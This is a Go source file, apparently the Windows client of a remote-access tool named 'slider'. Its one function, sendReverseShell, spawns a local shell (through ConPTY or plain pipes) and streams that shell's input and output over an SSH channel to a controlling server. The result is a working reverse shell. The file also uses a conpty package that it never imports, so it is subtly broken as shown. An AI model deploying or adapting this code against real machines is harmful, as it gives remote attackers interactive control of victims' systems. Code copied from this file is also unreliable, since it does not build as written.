//go:build windows

package client

import (
	"context"
	"encoding/json"
	"io"
	"os/exec"
	"slider/pkg/interpreter"

	"golang.org/x/crypto/ssh"
)

func (c *client) sendReverseShell(request *ssh.Request) {

	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
	if openErr != nil {
		c.Errorf("failed to open a \"session\" channel to server")
		return
	}
	defer func() { _ = channel.Close() }()

	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec

	if c.interpreter.PtyOn {
		// Request Server Terminal Size
		_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
		if reqErr != nil {
			c.Errorf("%s", reqErr)
		}
		var termSize interpreter.TermSize
		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
			// If error term initializes with size 0 0
			c.Errorf("%s", unMarshalErr)
		}

		// Notify server we will be sending a PTY
		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
		if errSSHReq != nil {
			c.Errorf("pty-req %s", errSSHReq)
		}

		c.interpreter.Pty, _ = conpty.Start(c.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
		defer func() { _ = c.interpreter.Pty.Close() }()

		// Notify server we will send a Reverse Shell
		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
		if errSSHReq != nil {
			c.Errorf("pty-req %s", errSSHReq)
		}

		go func() { _, _ = io.Copy(c.interpreter.Pty, channel) }()
		go func() { _, _ = io.Copy(channel, c.interpreter.Pty) }()

		// Reply Server we are good to go
		_ = c.replyConnRequest(request, true, []byte("shell-ready"))

		if code, err := c.interpreter.Pty.Wait(context.Background()); err != nil {
			c.Errorf("failed to spawn conpty with exit code %d", code)
		}
	} else {
		// - You are here cause the System is likely Windows < 2018 and does not support ConPTY
		// - Command Prompt Buffer Size can be set running: `mode con:cols=X lines=Y`,
		//   unfortunately there's no equivalent variable to set that up,
		//   so size won't be set or updated

		pr, pw := io.Pipe()

		cmd.Stdin = channel
		cmd.Stdout = pw
		cmd.Stderr = pw
		go func() { _, _ = io.Copy(channel, pr) }()

		// Reply Server we are good to go
		_ = c.replyConnRequest(request, true, []byte("shell-ready"))

		if runErr := cmd.Run(); runErr != nil {
			c.Errorf("%s", runErr)
		}
	}
}
